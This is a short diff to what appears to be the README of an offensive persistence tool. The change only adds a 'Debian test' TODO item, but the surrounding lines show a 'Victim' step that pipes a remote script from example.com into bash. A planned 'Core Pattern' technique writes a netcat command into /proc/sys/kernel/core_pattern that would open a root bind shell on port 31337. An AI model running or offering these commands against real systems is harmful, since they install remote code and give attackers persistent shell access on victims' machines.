@@ -31,6 +31,7 @@ Victim   : curl http://example.com/chocolatine.sh|bash
 
 
 ## TODO
+ - :x: Debian test
  - :x: Fish Shell (~/.config/fish/config.fish)
  - :x: Alias rewrite
  - :x: Core Pattern :   echo '|/bin/nc.traditional -l -p 31337 -e /bin/sh' | sudo tee /proc/sys/kernel/core_pattern
